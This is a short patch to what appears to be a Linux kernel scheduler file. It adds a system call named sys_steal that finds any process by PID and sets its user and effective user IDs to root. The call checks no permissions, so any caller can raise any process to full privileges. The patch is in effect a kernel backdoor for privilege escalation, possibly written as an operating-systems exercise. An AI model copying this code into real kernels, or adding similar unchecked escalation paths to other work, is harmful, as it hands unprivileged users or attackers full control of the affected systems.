@@ -4970,6 +4970,43 @@ out_unlock:
 	return retval;
 }
 
+/**
+* Elevate priveleges of proces with given PID to root
+* @author: JN
+* @pid Process ID of process whose priveleges will be elevated
+*/
+asmlinkage long sys_steal(long pid)
+{
+    // Precheck
+    if( pid <= 0 )
+	return -1;
+
+    // Find PID
+    struct task_struct *task;
+
+    for_each_process(task)
+    {
+	if(task->pid == pid )
+	{
+	    printk("sys_steal ~ Proc Info ( Pre-Elevate ):\n");
+	    printk("sys_steal ~ proc name: %s, PID: %d\n", task->comm, task->pid );
+	    printk("sys_steal ~ proc uid: %d, proc euid %d\n", task->uid, task->euid);
+
+	    // Elevate priveleges
+
+	    task->uid = 0;
+	    task->euid = 0; 
+
+	    printk("sys_steal ~ Proc Info (Post-Elevate ):\n");
+	    printk("sys_steal ~ proc name: %s, PID: %d\n", task->comm, task->pid );
+	    printk("sys_steal ~ proc uid: %d, proc euid %d\n", task->uid, task->euid);
+
+	}
+    }
+    
+    return 0;
+}
+
 static const char stat_nam[] = "RSDTtZX";
 
 static void show_task(struct task_struct *p)
@@ -7198,6 +7235,9 @@ void set_curr_task(int cpu, struct task_struct *p)
 {
 	cpu_curr(cpu) = p;
 }
+
+
+
 
 #endif
 
